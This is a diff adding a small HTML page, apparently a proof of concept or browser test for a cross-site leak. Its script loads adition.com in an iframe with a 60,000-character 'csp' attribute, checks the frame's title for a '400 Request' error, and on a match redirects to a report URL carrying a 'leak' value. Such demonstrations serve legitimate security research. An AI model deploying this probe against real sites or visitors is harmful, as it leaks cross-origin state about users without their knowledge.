@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <title>Example</title>
+</head>
+
+<body>
+  <script>
+    f = document.createElement('iframe');
+    f.src = 'https://adition.com/';
+    f.csp = 'a'.repeat(60000);
+    f.onload = function () {
+      if (f.contentDocument.title.indexOf("400 Request") >= 0) {
+        document.location.href = "https://adition.com/report/?leak=c1233067";
+      }
+    };
+    document.body.appendChild(f);
+  </script>
+</body>
+
+</html>
